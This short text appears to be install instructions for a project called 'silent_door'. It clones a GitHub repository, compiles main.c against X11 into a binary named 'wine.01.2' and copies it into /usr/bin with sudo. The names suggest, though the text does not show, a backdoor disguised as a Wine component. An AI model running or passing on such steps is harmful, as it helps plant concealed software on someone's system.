git clone https://github.com/mrx6SO/silent_door
cd silent_door 

apt install libx11-dev && apt-get update && apt upgrade -y 
cc main.c -o wine.01.2 -lm -w -lX11 

sudo cp wine.01.2 -t /usr/bin 

done



